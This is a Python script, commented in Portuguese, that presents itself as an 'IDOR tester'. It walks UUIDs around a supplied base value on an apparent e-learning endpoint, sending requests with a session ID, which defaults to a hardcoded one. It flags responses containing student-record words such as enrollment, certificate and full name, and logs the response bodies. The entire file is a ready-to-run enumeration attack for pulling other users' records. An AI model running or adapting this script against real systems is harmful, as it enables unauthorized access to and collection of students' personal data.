\
import os
import time
import requests
from urllib.parse import urlencode
from uuid import UUID

# ASCII ART do Touro
ascii_bull = r"""
        (__)
        (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
   ______ _______  _______ ______ _______
  (_____ (_______)(_______|_____ (_______)
   _____) )  _  \  _____   _____) )  _  \
  |  __  /  | |  | |  ___) |  __  /  | |  |
  | |  \ \_| |_| | | |_____| |  \ \_| |_| |
  |_|   \_)____/  |_______)_|   \_)____/  
"""

print(ascii_bull)
print("IDOR TESTER - por Tenorio (2025)")
print("=" * 80)

# Coleta de entrada
base_url = input("Digite a URL base (ex: https://exemplo.com/mpls/WebCds/cds.aspx): ").strip()
base_uuid_str = input("Digite o UUID base (ex: 041D9C81-5320-4A66-B9F1-8585ED7948E2): ").strip()
sid = input("SID (pressione Enter para usar '55f2zyv0odmc4lotbq3fitod'): ").strip() or "55f2zyv0odmc4lotbq3fitod"

try:
    base_uuid = UUID(base_uuid_str)
except:
    print("❌ UUID inválido. Abortando.")
    exit(1)

range_min = -10
range_max = 10
log_file = "idor_log_from_console.txt"

keywords_sucesso = [
    "aluno", "matrícula", "curso", "disciplinas",
    "bem-vindo", "progresso", "certificado", "nome completo"
]

print("\nIniciando testes...\n")
with open(log_file, "w", encoding="utf-8") as log:
    for i in range(range_min, range_max + 1):
        try:
            new_uuid = UUID(int=base_uuid.int + i)
            params = {
                "action": "launch",
                "ERL": str(new_uuid),
                "SID": sid,
                "AL": "True",
                "ResumeMode": "CP",
                "DCM": "ALL",
                "TzOffSet": "-3",
                "ServerID": "1",
                "LID": "00000000-0000-0000-0000-000000000000"
            }
            url = f"{base_url}?{urlencode(params)}"
            response = requests.get(url, timeout=10)

            conteudo = response.text.lower()
            sucesso = any(palavra in conteudo for palavra in keywords_sucesso)

            print(f"[{response.status_code}] Tentativa {i:+}: {new_uuid}")
            print(f"URL: {url}")
            if sucesso:
                palavras_encontradas = [k for k in keywords_sucesso if k in conteudo]
                print("✅ POSSÍVEL SUCESSO DETECTADO!")
                print(f"Palavras-chave encontradas: {palavras_encontradas}")
            print("-" * 100)

            log.write(f"[{response.status_code}] Tentativa {i:+}: {new_uuid}\n")
            log.write(f"URL: {url}\n")
            if sucesso:
                log.write(">>> POSSÍVEL SUCESSO DETECTADO <<<\n")
                log.write(f"Palavras-chave encontradas: {palavras_encontradas}\n")
            log.write(f"Resposta:\n{conteudo[:1000]}\n")
            log.write("-" * 100 + "\n")

            time.sleep(0.5)

        except Exception as e:
            print(f"❌ Erro com UUID {new_uuid}: {e}")
            log.write(f"Erro com UUID {new_uuid}: {e}\n")
            log.write("-" * 100 + "\n")

print("\nFim dos testes. Verifique o log em:", log_file)
